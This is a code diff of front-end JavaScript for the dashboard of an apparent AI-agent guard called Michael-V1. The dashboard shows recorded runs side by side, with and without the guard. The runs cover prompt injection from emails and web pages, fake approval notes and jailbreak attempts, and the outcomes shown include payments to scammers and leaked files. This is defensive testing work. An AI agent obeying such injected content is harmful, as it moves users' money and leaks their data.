-  document.querySelectorAll(".case").forEach((b) => b.classList.toggle("on", b.dataset.id === id));
-  renderLab();
+function runFor(caseId, model) {
+  const k = `${caseId}|${model}`;
+  if (S.live[k]) return { ...S.live[k], source: "live" };
+  const m = S.models?.runs?.[k];
+  if (m && !m.off?.error && !m.on?.error) return { ...m, source: "recorded" };
+  const other = Object.values(S.models?.runs || {}).find((r) => r.case === caseId && !r.off?.error && !r.on?.error);
+  if (other) return { ...other, source: "default" };
+  const r = S.score?.results?.find((x) => x.id === caseId);
+  return r ? { ...r, model: DEFAULT_MODEL, source: model === DEFAULT_MODEL ? "recorded" : "default" } : null;
 }
-document.querySelectorAll("#modeSeg button").forEach((b) => b.onclick = () => { S.mode = b.dataset.m; renderLab(); });
-const current = () => S.live || S.score?.results?.find((r) => r.id === S.sel);
-
-function renderLab() {
-  document.querySelectorAll("#modeSeg button").forEach((b) => b.classList.toggle("on", b.dataset.m === S.mode));
-  const rec = current(); if (!rec) return;
-  const s = rec[S.mode];
-  $("#cTitle").textContent = rec.title;
-  const res = { attack_succeeded: ["bad", "ATTACK SUCCEEDED"], defended: ["ok", "DEFENDED"], task_ok: ["ok", "TASK COMPLETED"], false_alarm: ["warn", "FALSE ALARM"], error: ["warn", "ERROR"] }[s.result];
-  $("#cMeta").innerHTML = `${CAT[rec.category] || ""} · ${S.live ? "live run" : "recorded " + esc(S.score?.generated || "")} ${res ? `&nbsp;<span class="tag ${res[0]}">${res[1]}</span>` : ""}`;
-  $("#cPrompt").textContent = rec.prompt || "";
-  $("#what").innerHTML = whatHappened(rec, s);
-  renderDamage(s.damage, rec.off?.damage);
-  $("#flow").innerHTML = flowSvg(s.flow || { sources: [], actions: [] }, S.mode === "on");
-  renderLog(s); renderWaterfall(s);
-  $("#answer").textContent = s.answer || "(no answer)";
-  const claims = (s.trace || []).find((e) => e.kind === "action_check")?.claims || [];
-  const bad = claims.filter((c) => c.verdict === "false").length;
-  $("#claimSum").innerHTML = claims.length ? `${claims.length} action claim(s) checked · ${bad ? `<span style="color:var(--bad)">${bad} false</span>` : "all verified"}` : "";
-  $("#audit").innerHTML = s.audit_ok === true ? `<span class="tag ok">AUDIT CHAIN VERIFIED</span>` : s.audit_ok === false ? `<span class="tag bad">AUDIT CHAIN BROKEN</span>` : `<span class="sub">no audit chain (older run)</span>`;
+function caseTitle(id) {
+  return Object.values(S.models?.runs || {}).find((r) => r.case === id)?.title || S.score?.results?.find((r) => r.id === id)?.title || id;
 }
-function whatHappened(rec, s) {
-  const d = s.damage || {}, acts = s.flow?.actions || [];
-  const blocked = acts.filter((a) => a.status === "blocked");
-  const harms = [];
-  if (d.money_moved > 0) harms.push(`paid <b>${inr(d.money_moved)}</b> to ${esc(d.payments.map((p) => p.account).join(", "))}`);
-  if (d.files_leaked?.length) harms.push(`sent <b>${esc(d.files_leaked.join(", "))}</b> outside the company`);
-  else if (d.external_emails?.length) harms.push(`emailed <b>${esc(d.external_emails.join(", "))}</b> outside the company`);
-  if (d.secrets_exposed?.length) harms.push(`exposed <b>${esc(d.secrets_exposed.join(", "))}</b>`);
-  const jb = (s.trace || []).find((e) => e.kind === "jailbreak_detected");
-  const benign = rec.category === "benign";
-  if (S.mode === "off") {
-    if (harms.length) return `<span style="color:var(--bad)">●</span> <b>Without protection</b>, the AI ${harms.join(" and ")}.`;
-    return benign ? `<span style="color:var(--ok)">●</span> A normal task: without protection the AI completed it.`
-      : `<span style="color:var(--warn)">●</span> <b>Without protection</b>, nothing harmful happened this time: the AI refused on its own. Models aren't consistent about this, which is why a guard that doesn't depend on the model matters.`;
+function renderPicker() {
+  const models = S.models?.models && Object.keys(S.models.models).length ? S.models.models : { [DEFAULT_MODEL]: "OpenAI gpt-oss 120B" };
+  $("#modelChips").innerHTML = Object.entries(models).map(([id, name]) => `<button class="chip ${id === S.model ? "on" : ""}" data-m="${esc(id)}">${esc(name)}<small>${esc(id.split("/")[0])}</small></button>`).join("");
+  document.querySelectorAll("[data-m]").forEach((b) => b.onclick = () => { S.model = b.dataset.m; renderPicker(); renderPlayground(); });
+  $("#caseChips").innerHTML = cases().slice(0, 14).map((id) => `<button class="chip ${id === S.caseId ? "on" : ""}" data-c="${esc(id)}">${esc(cut(caseTitle(id), 46))}</button>`).join("");
+  document.querySelectorAll("[data-c]").forEach((b) => b.onclick = () => { S.caseId = b.dataset.c; renderPicker(); renderPlayground(); });
+}
+function plainReason(r) {
+  return String(r || "").replace(/read_inbox:inbox/g, "an email in your inbox").replace(/web_fetch:(\S+?)\)/g, "the web page $1)")
+    .replace(/read_file:(\S+?)\)/g, "the file $1)").replace(/(send_email|make_payment)\.(\w+)=/g, (m, t, a) => "the " + ({ to: "recipient", account: "account", amount: "amount", attachment: "attachment" }[a] || a) + " ")
+    .replace(/was taken from untrusted content/, "came from").replace(/not from the user/g, "not from you");
+}
+const TOOLTXT = { read_inbox: ["mail", "Read your inbox"], list_files: ["file", "Looked at your files"], read_file: ["file", null], web_fetch: ["web", null] };
+function chatHtml(s) {
+  const out = [], tr = s.trace || [];
+  for (let i = 0; i < tr.length; i++) {
+    const e = tr[i];
+    if (e.kind === "user_prompt") out.push(`<div class="msg user">${esc(e.content)}</div>`);
+    else if (e.kind === "tool_call") {
+      const next = tr.slice(i + 1).find((x) => ["tool_blocked", "tool_result", "tool_call"].includes(x.kind));
+      const blocked = next?.kind === "tool_blocked";
+      const err = next?.kind === "tool_result" && next.result && typeof next.result === "object" && !Array.isArray(next.result) && next.result.error;
+      let ic, txt;
+      if (e.tool === "send_email") { ic = "send"; txt = `Send email to <b>${esc(e.args.to)}</b>${e.args.attachment ? ` with <b>${esc(e.args.attachment)}</b>` : ""}`; }
+      else if (e.tool === "make_payment") { ic = "pay"; txt = `Pay <b>${inr(e.args.amount)}</b> to account <b>${esc(e.args.account)}</b>`; }
+      else { const t = TOOLTXT[e.tool] || ["file", e.tool]; ic = t[0]; txt = t[1] || (e.tool === "read_file" ? `Opened ${esc(e.args.filename)}` : `Opened ${esc(cut(e.args.url, 40))}`); }
+      const risky = e.tool === "send_email" || e.tool === "make_payment";
+      const act = (s.flow?.actions || []).find((a) => a.target === String(e.args.to || e.args.account || ""));
+      const untrusted = act && act.origins.some((o) => !["user", "trusted-contact"].includes(o.origin));
+      const cls = blocked ? "blocked" : err ? "" : risky ? (untrusted || act?.external ? "bad" : "ok") : "";
+      const status = blocked ? `<span class="pill brand">Blocked</span>` : err ? `<span class="pill warn">Failed</span>` : risky ? (cls === "bad" ? `<span class="pill bad">Done ⚠</span>` : `<span class="pill ok">Done</span>`) : "";
+      const why = blocked ? `<span class="why">${esc(cut(plainReason(next.reason), 140))}</span>` : cls === "bad" ? `<span class="why">The target came from something the AI read, not from you.</span>` : "";
+      out.push(`<div class="act ${cls}"><div class="ic">${icon(blocked ? "block" : ic)}</div><div>${txt}${why}</div>${status}</div>`);
+    } else if (e.kind === "injection_detected") out.push(`<div class="note">${icon("eye")}Hidden instructions found in an email · hidden from the AI</div>`);
+    else if (e.kind === "secret_redacted") out.push(`<div class="note">${icon("shield")}Secrets (${esc(e.kinds.join(", "))}) hidden before the AI read them</div>`);
+    else if (e.kind === "jailbreak_detected") out.push(`<div class="note">${icon("shield")}Manipulation attempt recognised · nothing risky will run</div>`);
+    else if (e.kind === "impersonation_stripped") out.push(`<div class="note">${icon("shield")}Fake approval note removed</div>`);
+    else if (e.kind === "final_answer") out.push(`<div><div class="who">AI assistant</div><div class="msg ai">${esc(cut(e.content, 700))}</div></div>`);
   }
-  if (benign) return s.result === "false_alarm" ? `<span style="color:var(--warn)">●</span> Michael-V1 blocked a normal task (false alarm).`
-    : `<span style="color:var(--ok)">●</span> A normal task: <b>Michael-V1 let it through</b>, no false alarm.`;
-  if (jb) return `<span style="color:var(--accent)">●</span> <b>Michael-V1 caught the manipulation</b> in the request itself (${esc((jb.flagged_by || []).join(" + "))}) and nothing risky ran.`;
-  if (blocked.length) return `<span style="color:var(--accent)">●</span> <b>Michael-V1 blocked ${blocked.length} risky action${blocked.length > 1 ? "s" : ""}</b>: ${esc(cut(blocked[0].reason || "", 150))}`;
-  if (harms.length) return `<span style="color:var(--bad)">●</span> Even with Michael-V1, the AI ${harms.join(" and ")}.`;
-  return `<span style="color:var(--ok)">●</span> <b>No harm done.</b> Michael-V1 watched every step${(s.trace || []).some((e) => ["injection_detected", "secret_redacted", "impersonation_stripped"].includes(e.kind)) ? " and cleaned what the AI read" : ""}.`;
+  return out.join("") || `<div class="small">No steps recorded.</div>`;
 }
-function renderDamage(d, offD) {
-  d = d || { money_moved: 0, payments: [], external_emails: [], files_leaked: [], secrets_exposed: [] };
-  const cell = (l, v, sub, hit) => `<div><div class="l">${l}</div><div class="v" style="color:${hit ? "var(--bad)" : "var(--ok)"}">${v}</div><div class="s" title="${esc(sub)}">${esc(sub)}</div></div>`;
-  const prevented = (k) => S.mode === "on" && offD && (Array.isArray(offD[k]) ? offD[k].length : offD[k]) ? "prevented" : "none";
-  $("#dmg").innerHTML =
-    cell("Money moved", inr(d.money_moved), d.payments.map((p) => "→ " + p.account).join(", ") || prevented("money_moved"), d.money_moved > 0) +
-    cell("Emails left company", d.external_emails.length, d.external_emails.join(", ") || prevented("external_emails"), d.external_emails.length) +
-    cell("Files leaked", d.files_leaked.length, d.files_leaked.join(", ") || prevented("files_leaked"), d.files_leaked.length) +
-    cell("Secrets exposed", d.secrets_exposed.length, d.secrets_exposed.join(", ") || prevented("secrets_exposed"), d.secrets_exposed.length);
+function verdictOf(s, isAttack) {
+  const d = s.damage || {}, harms = [];
+  if (d.money_moved > 0) harms.push(`${inr(d.money_moved)} paid to a scammer`);
+  if (d.files_leaked?.length) harms.push(`${d.files_leaked.join(", ")} leaked`);
+  else if (d.external_emails?.length) harms.push("email sent outside the company");
+  if (d.secrets_exposed?.length) harms.push("secrets exposed");
+  if (harms.length) return ["bad", "Harm done: " + harms.join(" · ")];
+  if (s.result === "false_alarm") return ["neutral", "A normal request was blocked (false alarm)"];
+  if ((s.trace || []).some((e) => e.kind === "tool_blocked" || e.kind === "jailbreak_detected")) return ["ok", "Attack stopped. Nothing harmful happened"];
+  return isAttack ? ["ok", "No harm this time"] : ["ok", "Task done, no false alarm"];
 }
-function renderLog(s) {
-  const t0 = s.trace?.[0]?.t || 0, rows = [];
-  (s.trace || []).forEach((e) => {
-    const R = (cls, who, msg) => rows.push(`<div class="r ${cls}"><span class="who">+${Math.max(0, Math.round((e.t - t0) * 1000))}ms</span><span class="who">${who}</span><span class="msg">${msg}</span></div>`);
-    switch (e.kind) {
-      case "user_prompt": R("", "user", esc(cut(e.content, 160))); break;
-      case "tool_call": R("", "agent", `${esc(e.tool)} <span class="muted">${esc(cut(JSON.stringify(e.args), 110))}</span>`); break;
-      case "tool_blocked": R("shield", "michael-v1", `BLOCK ${esc(e.tool)}: ${esc(e.reason)}`); break;
-      case "injection_detected": R("shield", "michael-v1", `quarantined ${esc(e.item)} (prompt-guard ${e.score})`); break;
-      case "jailbreak_detected": R("shield", "michael-v1", `input gate flagged by ${esc((e.flagged_by || []).join(" + "))}${(e.rules || []).length ? " · " + esc(e.rules.join(", ")) : ""}${(e.tricks || []).length ? " · " + esc(e.tricks.join(", ")) : ""}`); break;
-      case "secret_redacted": R("shield", "michael-v1", `redacted ${esc(e.kinds.join(", "))} from ${esc(e.source)}`); break;
-      case "impersonation_stripped": R("shield", "michael-v1", `stripped ${e.count} fake approval marker(s) from ${esc(e.source)}`); break;
-      case "content_truncated": R("shield", "michael-v1", `truncated oversized content from ${esc(e.source)}`); break;
-      case "integrity": if (!e.policy_ok) R("bad", "michael-v1", "policy integrity FAILED: " + esc(e.reason)); break;
-      case "tool_result": {
-        const err = e.result && typeof e.result === "object" && !Array.isArray(e.result) && e.result.error;
-        if (HIGH.has(e.tool) && !err) R("bad", "effect", `${esc(e.tool)} executed ${esc(cut(JSON.stringify(e.result), 90))}`);
-        break;
-      }
-      case "action_check": e.claims.filter((c) => c.verdict === "false").forEach((c) => R("shield", "fact-check", `false claim: “${esc(cut(c.text, 120))}”`)); break;
-      case "final_answer": R("", "agent", "answered the user"); break;
-    }
-  });
-  $("#log").innerHTML = rows.join("") || `<div class="r"><span></span><span></span><span class="msg muted">no events</span></div>`;
+function phone(title, cls, s, rec, shield) {
+  const [vc, vt] = verdictOf(s, rec.category !== "benign");
+  const ai = s.llm_ms || 0, sh = s.shield_ms || 0;
+  return `<div class="card phone ${cls}">
+    <div class="top"><b>${title}</b><span class="pill ${shield ? "brand" : ""}">${shield ? icon("check") + "Protected" : "Unprotected"}</span></div>
+    <div class="verdict ${vc}">${esc(vt)}</div>
+    <div class="chat">${chatHtml(s)}</div>
+    <div class="foot"><span>AI thinking ${ms(ai)}${shield ? ` · Michael-V1 <b style="color:var(--brand)">${ms(sh)}</b>` : ""}</span>
+      ${shield ? `<span class="bar"><span style="width:${Math.max(sh / (ai + sh || 1) * 100, 2)}%;background:var(--brand)"></span><span style="flex:1;background:#e2e8f0"></span></span>` : ""}</div></div>`;
 }
-function renderWaterfall(s) {
-  const tr = s.trace || [], items = [];
-  let n = 0;
-  tr.forEach((e) => {
-    if (e.kind === "llm_timing") items.push({ label: `AI model call #${++n}`, start: e.t - e.ms / 1000, dur: e.ms, color: "var(--ai)" });
-    else if (e.kind === "shield_timing") items.push({ label: "shield · " + e.check.replace(/^check_|^process_/, "").replace(/_/g, " "), start: e.t - e.ms / 1000, dur: e.ms, color: "var(--accent)" });
-    else if (e.kind === "tool_call") items.push({ label: "tool · " + e.tool, start: e.t, dur: 0, color: HIGH.has(e.tool) ? "var(--warn)" : "var(--muted)" });
-    else if (e.kind === "tool_blocked") items.push({ label: "blocked · " + e.tool, start: e.t, dur: 0, color: "var(--bad)" });
-  });
-  if (!items.length) { $("#wf").innerHTML = ""; $("#wfSum").textContent = ""; return; }
-  const t0 = Math.min(...items.map((i) => i.start)), t1 = Math.max(...items.map((i) => i.start + i.dur / 1000));
-  const span = Math.max(t1 - t0, 0.001), pos = (t) => ((t - t0) / span) * 100;
-  const sumAi = items.filter((i) => i.color === "var(--ai)").reduce((a, i) => a + i.dur, 0);
-  const sumSh = items.filter((i) => i.color === "var(--accent)").reduce((a, i) => a + i.dur, 0);
-  $("#wfSum").innerHTML = S.mode === "on" ? `AI ${ms(sumAi)} · <span style="color:var(--accent)">Michael-V1 ${ms(sumSh)} (${(sumSh / (sumAi + sumSh || 1) * 100).toFixed(2)}%)</span>` : `AI ${ms(sumAi)} · no shield`;
-  $("#wf").innerHTML = `<div class="axis"><span></span><div class="ticks">${[0, .5, 1].map((f) => `<span style="left:${f * 100}%">${ms(span * 1000 * f)}</span>`).join("")}</div><span></span></div>` +
-    items.map((i) => `<div class="row"><span class="lab2" title="${esc(i.label)}">${esc(i.label)}</span><div class="track">${i.dur > 0
-      ? `<div class="bar" style="left:${pos(i.start)}%;width:${Math.max((i.dur / 1000 / span) * 100, .25)}%;background:${i.color}"></div>`
-      : `<div class="pt" style="left:${pos(i.start)}%;background:${i.color}"></div>`}</div><span class="ms">${i.dur > 0 ? ms(i.dur) : ""}</span></div>`).join("");
-}
-function flowSvg(flow, shield) {
-  const srcs = flow.sources || [], acts = flow.actions || [];
-  const W = 640, rows = Math.max(srcs.length, acts.length, 2), H = 40 + rows * 76;
-  const X = { s: 110, a: 320, w: 445, t: 545 }, NW = 180, NH = 50;
-  const ys = (n, i) => 20 + ((H - 20) / (n + 1)) * (i + 1), ay = 20 + (H - 20) / 2, sy = {};
-  srcs.forEach((s, i) => sy[s.id] = ys(srcs.length, i));
-  const worst = (a) => { const o = a.origins.map((x) => x.origin); return o.find((x) => !["user", "trusted-contact", "unknown"].includes(x)) || (o.includes("unknown") ? "unknown" : o[0] || "user"); };
-  const col = (o) => o === "user" || o === "trusted-contact" ? "var(--ok)" : o === "unknown" ? "var(--warn)" : "var(--bad)";
-  const tainted = new Set(acts.map(worst));
-  const c = (x1, y1, x2, y2) => `M${x1},${y1} C${(x1 + x2) / 2},${y1} ${(x1 + x2) / 2},${y2} ${x2},${y2}`;
-  let o = `<svg viewBox="0 0 ${W} ${H}" font-family="Inter, sans-serif" style="width:100%;height:auto">`;
-  srcs.forEach((s) => { const red = tainted.has(s.id) && s.id !== "user";
-    o += `<path d="${c(X.s + 70, sy[s.id], X.a - 30, ay)}" fill="none" stroke="${red ? "var(--bad)" : s.id === "user" ? "var(--ok)" : "var(--line2)"}" stroke-width="${red ? 2.2 : 1.3}"/>`; });
-  if (shield) o += `<line x1="${X.w}" y1="14" x2="${X.w}" y2="${H - 12}" stroke="var(--accent)" stroke-width="1.5" stroke-dasharray="4 4"/><text x="${X.w}" y="${H - 1}" text-anchor="middle" fill="var(--accent)" font-size="9.5" font-family="JetBrains Mono, monospace" letter-spacing="1.5">MICHAEL-V1</text>`;
-  acts.forEach((a, i) => { const y = ys(acts.length, i), cc = col(worst(a));
-    if (a.status === "blocked") o += `<path d="${c(X.a + 30, ay, X.w - 9, y)}" fill="none" stroke="${cc}" stroke-width="2"/><circle cx="${X.w}" cy="${y}" r="9" fill="var(--panel)" stroke="var(--accent)" stroke-width="1.5"/><path d="M${X.w - 3.5},${y - 3.5} L${X.w + 3.5},${y + 3.5} M${X.w + 3.5},${y - 3.5} L${X.w - 3.5},${y + 3.5}" stroke="var(--bad)" stroke-width="2" stroke-linecap="round"/>`;
-    else o += `<path d="${c(X.a + 30, ay, X.t - 70, y)}" fill="none" stroke="${cc}" stroke-width="2" ${a.status === "failed" ? 'stroke-dasharray="4 4"' : ""}/>`; });
-  srcs.forEach((s) => { const y = sy[s.id], red = tainted.has(s.id) && s.id !== "user";
-    o += `<rect x="${X.s - 70}" y="${y - NH / 2}" width="140" height="${NH}" rx="8" fill="var(--panel2)" stroke="${s.id === "user" ? "rgba(52,211,153,.5)" : red ? "rgba(244,63,94,.6)" : "var(--line2)"}"/>
-      <text x="${X.s - 58}" y="${y - 4}" fill="var(--text)" font-size="12" font-weight="600">${esc(cut(s.id === "user" ? "User" : s.label.replace(/^\S+\s/, ""), 18))}</text>
-      <text x="${X.s - 58}" y="${y + 12}" fill="${s.flags.length ? "var(--warn)" : "var(--faint)"}" font-size="10" font-family="JetBrains Mono, monospace">${esc(cut(s.flags[0] || (s.id === "user" ? "trusted" : "untrusted"), 22))}</text>`; });
-  o += `<circle cx="${X.a}" cy="${ay}" r="30" fill="var(--panel2)" stroke="var(--line2)"/><text x="${X.a}" y="${ay + 4}" text-anchor="middle" fill="var(--muted)" font-size="11" font-family="JetBrains Mono, monospace">agent</text>`;
-  if (!acts.length) o += `<text x="${X.t}" y="${ay + 4}" text-anchor="middle" fill="var(--faint)" font-size="11" font-family="JetBrains Mono, monospace">no risky actions</text>`;
-  acts.forEach((a, i) => { const y = ys(acts.length, i), wo = worst(a), done = a.status === "executed", bad = done && !["user", "trusted-contact"].includes(wo);
-    const st = a.status === "blocked" ? "var(--line2)" : bad ? "var(--bad)" : done && !a.external ? "var(--ok)" : "var(--warn)";
-    o += `<g opacity="${a.status === "blocked" ? .6 : 1}"><rect x="${X.t - 70}" y="${y - NH / 2}" width="160" height="${NH}" rx="8" fill="${bad ? "rgba(244,63,94,.08)" : "var(--panel2)"}" stroke="${st}"/>
-      <text x="${X.t - 60}" y="${y - 5}" fill="var(--text)" font-size="11.5" font-weight="600">${a.tool === "make_payment" ? "pay" : "email"} → ${esc(cut(a.target, 16))}</text>
-      <text x="${X.t - 60}" y="${y + 12}" fill="${st === "var(--line2)" ? "var(--muted)" : st}" font-size="10" font-family="JetBrains Mono, monospace">${a.status.toUpperCase()}${a.detail ? " · " + esc(cut(a.detail, 13)) : ""}</text></g>`; });
-  return o + "</svg>";
+function renderPlayground() {
+  const rec = runFor(S.caseId, S.model);
+  if (!rec) { $("#duo").innerHTML = `<div class="card pad small">No recording for this situation yet. Press "Run it live now".</div>`; return; }
+  const name = (m) => S.models?.models?.[m] || m;
+  $("#duo").innerHTML = phone("Without Michael-V1", "off", rec.off, rec, false) + phone("With Michael-V1", "on", rec.on, rec, true);
+  $("#liveNote").textContent = rec.source === "default" ? `Not recorded on ${name(S.model)} yet: showing ${name(rec.model)}. "Run it live now" tries ${name(S.model)}.`
+    : rec.source === "live" ? `Live run on ${name(rec.model)}.` : `Recorded run on ${name(rec.model)}. "Run it live now" repeats it (~10-20 s, uses the AI service).`;
 }
 $("#liveBtn").onclick = async () => {
-  const rec = S.score?.results?.find((r) => r.id === S.sel); if (!rec) return;
-  const b = $("#liveBtn"); b.disabled = true; b.innerHTML = `<span class="spin"></span> Running…`;
+  const b = $("#liveBtn"); b.disabled = true; b.innerHTML = `<span class="spin"></span> Running both sides…`;
   try {
-    const r = await fetch("/api/compare", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ case_id: rec.id }) });
+    const r = await fetch("/api/compare", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ case_id: S.caseId, model: S.model }) });
     if (!r.ok) throw new Error(await r.text());
-    const d = await r.json();
-    S.live = { ...rec, off: d.off, on: d.on };
-    renderLab();
-  } catch (e) { alert("Live run failed: " + e.message); }
-  b.disabled = false; b.innerHTML = `<svg class="i"><use href="#i-play"/></svg>Run live`;
+    const d = await r.json(), base = runFor(S.caseId, S.model) || {};
+    S.live[`${S.caseId}|${S.model}`] = { ...base, model: S.model, off: d.off, on: d.on };
+    renderPlayground();
+  } catch (e) { $("#liveNote").textContent = "Live run failed: " + e.message; }
+  b.disabled = false; b.innerHTML = `${icon("bolt")}Run it live now`;
 };
 
-// ---------------- benchmark ----------------
-document.querySelectorAll("#splitSeg button").forEach((b) => b.onclick = () => { S.split = b.dataset.s; renderBench(); renderOverview(); });
-function renderBench() {
-  document.querySelectorAll("#splitSeg button").forEach((b) => b.classList.toggle("on", b.dataset.s === S.split));
-  const B = S.bench?.[S.split];
-  renderHistory();
-  if (!B?.configs) {
-    const other = S.split === "test" ? "dev" : "test";
-    $("#benchNote").textContent = "Self-run on the public AgentShield Benchmark corpus.";
-    $("#verdict").innerHTML = `<div class="empty" style="grid-column:1/-1">The <b>${S.split}</b> half of the exam hasn't been run yet${S.bench?.[other]?.configs ? ` · <a href="#benchmark" onclick="S.split='${other}';renderBench();return false" style="color:var(--accent)">show the ${other} half</a>` : ""}<br><br><code>python -m michael.benchmark --split ${S.split}</code></div>`;
-    ["#scatter", "#ablation", "#cats", "#benchCaveat"].forEach((x) => $(x).innerHTML = `<div class="empty">No data for this split yet.</div>`);
-    return;
-  }
-  const full = B.configs["Michael-V1 gate (full)"];
-  const lak = (B.published || []).find((p) => p.name === "Lakera Guard"), llmg = (B.published || []).find((p) => p.name === "LLM Guard");
-  const better = (B.published || []).filter((p) => p.score < full.final).map((p) => p.name);
-  $("#verdict").innerHTML = `<div class="score">${full.final}<small> / 100</small></div><div>
-    <p><b>Michael-V1 scores ${full.final}</b> on the ${S.split === "test" ? "held-out" : "dev"} half (${B.cases} messages)${lak ? `, ${full.final >= lak.score ? "ahead of" : "close to"} Lakera Guard (${lak.score})` : ""}${llmg ? ` and well above LLM Guard (${llmg.score})` : ""}.</p>
-    <p>It wrongly blocked only <b>${full.over_refusal_fpr}%</b> of normal requests${lak?.categories?.["over-refusal"] != null ? ` (Lakera Guard: ${(100 - lak.categories["over-refusal"]).toFixed(1)}%)` : ""}. Scores higher than ${better.length} of ${(B.published || []).length} published shields. A local model on the laptop's CPU decides most inputs in ~${Math.round(full.latency.p50)} ms; only unsure ones go to the hosted detectors. Measured in fast (latency-optimized) mode.</p></div>`;
-  $("#benchNote").innerHTML = `Self-run on the public <b>AgentShield Benchmark</b> corpus (doronp/agentshield-benchmark, Apache-2.0) with a Python port of its scoring formula. ${S.split === "test" ? "<b>Held-out test split</b>, never used for tuning." : "Dev split, used for tuning."} ${B.cases} cases.`;
-  // published shields (grey) + Michael-V1 configs (cyan); identical points are merged into one label
-  const pts = (B.published || []).map((p) => ({ n: p.name, x: Math.max(p.p50, .5), y: p.score, me: false }));
-  const mine = {};
-  Object.entries(B.configs).forEach(([n, c]) => { const k = c.final + "|" + c.latency.p50; (mine[k] ||= { x: Math.max(c.latency.p50, .5), y: c.final, names: [], main: false }).names.push(n); if (n.includes("full")) mine[k].main = true; });
-  Object.values(mine).forEach((m) => pts.push({ n: m.main ? "Michael-V1" : m.names.map((x) => x.replace(" only", "").replace("+ ", "")).join(" / "), x: m.x, y: m.y, me: true, main: m.main }));
-  const W = 560, H = 330, L = 40, R = 16, T = 18, Bm = 40;
-  const lx = (v) => L + (Math.log10(v) - Math.log10(.5)) / (Math.log10(3000) - Math.log10(.5)) * (W - L - R);
-  const ly = (v) => T + (1 - v / 100) * (H - T - Bm);
-  let svg = `<svg viewBox="0 0 ${W} ${H}" font-family="JetBrains Mono, monospace" font-size="10">`;
-  [0, 25, 50, 75, 100].forEach((v) => svg += `<line x1="${L}" x2="${W - R}" y1="${ly(v)}" y2="${ly(v)}" stroke="var(--line)"/><text x="${L - 8}" y="${ly(v) + 3}" text-anchor="end" fill="var(--faint)">${v}</text>`);
-  [1, 10, 100, 1000].forEach((v) => svg += `<line y1="${T}" y2="${H - Bm}" x1="${lx(v)}" x2="${lx(v)}" stroke="var(--line)"/><text x="${lx(v)}" y="${H - Bm + 14}" text-anchor="middle" fill="var(--faint)">${v} ms</text>`);
-  svg += `<text x="${(W + L) / 2}" y="${H - 6}" text-anchor="middle" fill="var(--muted)">p50 latency per check (log scale) · score 0-100</text>`;
-  // simple label collision avoidance: nudge labels that land on an earlier label
+// ---------- any model ----------
+function renderMatrix() {
+  const M = S.models;
+  if (!M || !Object.keys(M.runs || {}).length) { $("#matrix").innerHTML = `<div class="pad small">Recording in progress: run <span class="mono">python -m michael.models_demo</span>.</div>`; return; }
+  const models = Object.keys(M.models), cs = [...new Set(Object.values(M.runs).map((r) => r.case))];
+  const badge = (run, attack) => {
+    if (!run) return `<span class="pill">not run</span>`;
+    const r = run.result;
+    return r === "attack_succeeded" ? `<span class="pill bad">Harm done</span>` : r === "false_alarm" ? `<span class="pill warn">False alarm</span>` : r === "error" ? `<span class="pill">pending</span>` : `<span class="pill ok">${attack ? "Safe" : "Works"}</span>`;
+  };
+  $("#matrix").innerHTML = `<table><tr><th>Situation</th>${models.map((m) => `<th>${esc(M.models[m])}</th>`).join("")}</tr>` +
+    cs.map((c) => { const any = Object.values(M.runs).find((r) => r.case === c), attack = any.category !== "benign";
+      return `<tr><td><b>${esc(any.title)}</b><div class="small">${attack ? CAT[any.category] || "Attack" : "Normal task"}</div></td>` +
+        models.map((m) => { const r = M.runs[`${c}|${m}`];
+          return `<td><div class="cell" data-goto="${esc(c)}|${esc(m)}"><span class="small">without</span>${badge(r?.off, attack)}<span class="small">with Michael-V1</span>${badge(r?.on, attack)}</div></td>`; }).join("") + "</tr>"; }).join("") + "</table>";
+  document.querySelectorAll("[data-goto]").forEach((el) => el.onclick = () => { const [c, m] = el.dataset.goto.split("|"); S.caseId = c; S.model = m; renderPicker(); renderPlayground(); location.hash = "#playground"; });
+}
+const CODE = {
+  sdk: ["Python SDK", `<span class="k">from</span> michael.sdk <span class="k">import</span> Michael
+guard = Michael()                                    <span class="c"># loads policy.yaml</span>
+
+<span class="k">@guard.tool</span>(reads_untrusted=<span class="k">True</span>)                    <span class="c"># outside content: scanned + tracked</span>
+<span class="k">def</span> read_inbox(): ...
+
+<span class="k">@guard.tool</span>(risk=<span class="s">"high"</span>, sinks={<span class="s">"to"</span>: <span class="s">"strict"</span>})   <span class="c"># target must come from the user</span>
+<span class="k">def</span> send_email(to, subject, body): ...
+
+<span class="k">with</span> guard.session(user_prompt) <span class="k">as</span> s:
+    ...                    <span class="c"># your agent loop, any model, calls the tools as usual</span>
+    answer = s.check_answer(model_reply)   <span class="c"># catches "I sent it" when it didn't happen</span>`],
+  openai: ["OpenAI-style tool calls", `<span class="c"># Any OpenAI-compatible API: OpenAI, Groq, Together, Ollama, vLLM...</span>
+resp = client.chat.completions.create(model=<span class="s">"any-model"</span>, messages=msgs, tools=tools)
+<span class="k">with</span> guard.session(user_prompt) <span class="k">as</span> s:
+    <span class="k">for</span> call <span class="k">in</span> resp.choices[0].message.tool_calls:
+        args = json.loads(call.function.arguments)
+        verdict = s.check_action(call.function.name, args)   <span class="c"># None = allowed</span>
+        result = verdict <span class="k">or</span> TOOLS[call.function.name](**args)
+        msgs.append({<span class="s">"role"</span>: <span class="s">"tool"</span>, <span class="s">"tool_call_id"</span>: call.id, <span class="s">"content"</span>: json.dumps(result)})`],
+  claude: ["Claude / Gemini / others", `<span class="c"># Every agent ends up calling a function with arguments. Route it through the session:</span>
+<span class="k">for</span> block <span class="k">in</span> claude_response.content:
+    <span class="k">if</span> block.type == <span class="s">"tool_use"</span>:
+        verdict = s.check_action(block.name, block.input)
+        result = verdict <span class="k">or</span> TOOLS[block.name](**block.input)
+
+<span class="c"># Untrusted content (emails, pages, RAG chunks, other agents' messages):</span>
+clean = s.record_read(<span class="s">"fetch_page"</span>, {<span class="s">"url"</span>: url}, page_text)`],
+  ops: ["Run & audit", `python -m michael.scan                 <span class="c"># posture scan, graded A-F, before you deploy</span>
+python -m tests.test_self_defense      <span class="c"># 21 attacks on the shield itself</span>
+python -m tests.test_sdk               <span class="c"># the SDK with a stand-in for any model</span>
+python -m michael.server               <span class="c"># this console</span>
+<span class="c"># kill switch: create michael/shield/KILL (or MICHAEL_KILL=1) to freeze every risky action</span>`],
+};
+function renderCode(k) {
+  $("#codeTabs").innerHTML = Object.entries(CODE).map(([id, [name]]) => `<button class="chip ${id === k ? "on" : ""}" data-code="${id}">${name}</button>`).join("");
+  document.querySelectorAll("[data-code]").forEach((b) => b.onclick = () => renderCode(b.dataset.code));
